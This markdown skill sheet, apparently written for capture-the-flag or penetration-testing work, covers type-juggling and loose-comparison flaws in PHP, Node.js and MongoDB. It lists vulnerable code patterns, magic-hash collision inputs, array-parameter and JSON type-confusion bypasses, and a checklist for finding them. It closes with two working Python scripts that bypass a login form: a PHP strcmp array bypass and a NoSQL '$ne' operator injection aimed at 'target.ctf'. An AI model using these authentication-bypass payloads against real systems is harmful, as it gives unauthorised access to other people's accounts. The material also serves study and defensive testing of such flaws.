# Type Juggling & Loose Comparison Exploits (skills/web/type-juggling.md)

## 1. Signatures & Code Patterns

Occurs when dynamically typed languages evaluate equality loosely (`==` instead of `===` or loose casting):

| Language | Vulnerable Pattern | Exploitation Technique |
| :--- | :--- | :--- |
| **PHP Loose Equality** | `if ($hash == "0")`, `if (md5($pass) == 0)` | Magic hashes starting with `0e` followed by digits (scientific notation evaluates to `0`). |
| **PHP `strcmp()`** | `if (strcmp($_POST['password'], $secret) == 0)` | Pass an array `password[]=` $\rightarrow$ `strcmp` returns `NULL` $\rightarrow$ `NULL == 0` evaluates to `true`. |
| **PHP `in_array()`** | `in_array($user_role, [1, 2], false)` | Loose check: `"1admin"` is converted to integer `1` $\rightarrow$ evaluates to `true`. |
| **Node.js / Express** | `if (req.body.token == secret)` | Supply non-string JSON type (e.g. `{"token": true}` or `{"token": 0}`). |
| **MongoDB / NoSQL** | `db.users.find({username: user, password: pass})` | Supply BSON object: `{"username": "admin", "password": {"$ne": ""}}` or `{"$gt": ""}`. |

---

## 2. Decision Flowchart & Checklist

1. **Check Comparison Operator**: Is it loose (`==`) or strict (`===`)?
2. **Magic Hash Comparison**:
   - MD5: `"240610708"` $\rightarrow$ `0e462097431906509019562988736854` == `0`.
   - SHA1: `"10932435112"` $\rightarrow$ `0e077669150041331763470558650260` == `0`.
   - SHA256: `0e...` strings match other `0e...` hashes under loose equality.
3. **Array Parameter Bypass**: Test query parameter `key[]=test` vs `key=test`.
4. **JSON Type Confusion**: Test `{"password": true}` or `{"id": {"$gt": 0}}`.

---

## 3. Exploit Snippets

### 3.1 PHP Array Bypass (Requests)
```python
import requests

# Bypass strcmp(password, $flag) == 0
res = requests.post("http://target.ctf/login.php", data={"username": "admin", "password[]": ""})
print(f"[+] Bypass Response: {res.text}")
```

### 3.2 NoSQL Operator Injection (JSON)
```python
import requests

url = "http://target.ctf/api/login"
payload = {"username": "admin", "password": {"$ne": "wrong_password"}}
res = requests.post(url, json=payload)
print(f"[+] NoSQL Auth Bypass: {res.text}")
```
